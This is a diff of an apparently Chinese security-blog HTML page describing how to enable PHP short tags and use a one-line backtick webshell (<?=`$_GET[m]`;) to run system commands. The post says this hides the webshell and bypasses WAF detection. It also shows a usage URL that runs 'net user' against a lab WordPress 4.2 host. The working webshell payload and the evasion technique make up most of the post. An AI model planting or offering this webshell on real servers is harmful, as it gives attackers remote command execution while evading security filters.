@@ -173,8 +173,7 @@
         <!-- Post Content -->
         <p><br></p>
 <h5 id="利用php短格式简单bypasswaf查杀"><a href="#利用php短格式简单bypasswaf查杀" class="headerlink" title="利用php短格式简单bypasswaf查杀:"></a>利用php短格式简单bypasswaf查杀:</h5><p>需要php开启短格式支持,到php.ini中去开启一下,然后重启web服务即可<br>[当然啦,它默认是不开的,生产环境中也很少会有运维去开,直接利用可能不太行,但用来隐藏webshell或者bypass waf还是值得尝试的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">short_open_tag = On</div></pre></td></tr></table></figure></p>
-<p><img src="/img/short_open_tag .png" alt=""></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=<span class="string">`$_GET[m]`</span>;   在php中反引号可直接用来执行系统命令,跟shell的反引号作用类似</div></pre></td></tr></table></figure>
+<p><img src="/img/short_open_tag .png" alt=""><br><a id="more"></a><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=<span class="string">`$_GET[m]`</span>;   在php中反引号可直接用来执行系统命令,跟shell的反引号作用类似</div></pre></td></tr></table></figure></p>
 <p><img src="/img/short_open_tag shel .png" alt=""><br><img src="/img/short_open_tag waf .png" alt=""></p>
 <p>然后访问webshell,执行系统命令即可,直接右键看源代码格式可能会稍微工整一些<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">view-<span class="symbol">source:</span><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wordpress</span>-<span class="number">4.2</span>/shrot.php?m=net user</div></pre></td></tr></table></figure></p>
 <p><img src="/img/short_open_tag res .png" alt=""><br></p>
